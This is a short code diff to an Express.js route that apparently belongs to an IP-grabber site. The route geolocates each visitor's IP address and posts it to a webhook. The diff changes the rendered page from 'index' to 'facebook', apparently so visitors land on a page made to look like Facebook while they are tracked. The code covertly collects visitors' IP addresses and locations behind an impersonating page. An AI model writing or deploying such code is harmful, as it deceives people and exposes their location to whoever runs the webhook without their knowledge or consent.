@@ -12,7 +12,7 @@ router.get("/", (req, res, next) => {
     if(!ip) {
         hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
         console.log(ip)
-        res.render("index")
+        res.render("facebook")
     } else {
       const SplitIp = ip.split(",")[0];
       const geo = geoip.lookup(SplitIp) || { country: null, region: null, timezone: null, city: null };
@@ -48,7 +48,7 @@ router.get("/", (req, res, next) => {
         console.log(`${ip} just accessed the site.`)
         console.log(geo)
         hook.send(embed);
-        res.render('index')
+        res.render('facebook')
       }
     }
   } catch (error) {
